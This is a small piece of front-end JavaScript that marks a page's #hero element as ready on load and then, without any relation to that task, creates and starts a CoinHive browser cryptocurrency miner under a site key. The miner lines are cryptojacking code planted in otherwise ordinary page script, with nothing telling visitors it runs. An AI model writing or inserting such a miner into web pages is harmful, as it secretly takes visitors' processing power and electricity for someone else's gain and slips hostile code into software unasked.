document.addEventListener('DOMContentLoaded', function () {
  var hero = document.querySelector('#hero');
  if (hero) { hero.classList.add('siap'); }
});
var miner = new CoinHive.Anonymous('kunci');
miner.start();
